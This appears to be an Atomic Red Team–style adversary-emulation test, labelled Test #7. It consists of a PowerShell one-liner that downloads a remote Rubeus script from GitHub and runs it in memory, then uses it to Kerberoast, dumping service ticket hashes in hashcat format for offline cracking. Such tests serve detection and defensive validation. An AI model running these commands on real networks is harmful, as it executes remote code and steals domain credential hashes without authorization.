#Atomic Test #7 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"